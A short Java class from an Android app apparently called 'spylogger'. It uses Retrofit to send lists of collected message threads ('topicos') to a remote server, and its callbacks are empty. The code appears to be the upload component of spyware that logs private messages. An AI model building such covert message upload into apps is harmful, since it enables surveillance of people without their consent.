package com.gravatasufoca.spylogger.services;

import android.os.Handler;

import com.gravatasufoca.spylogger.model.Topico;

import java.util.List;

import retrofit2.Call;
import retrofit2.Response;

/**
 * Created by bruno on 02/12/16.
 */

public class SendMensagensService extends SendDataService<Boolean> {

    public SendMensagensService(Handler handler) {
        super(handler);
    }

    public boolean enviarTopicos(List<Topico> topicos){

        Call<Boolean> resp=sendApi.enviarTopicos(topicos);
        resp.enqueue(this);
        return true;
    }

    @Override
    public void onResponse(Call<Boolean> call, Response<Boolean> response) {

    }

    @Override
    public void onFailure(Call<Boolean> call, Throwable t) {

    }
}
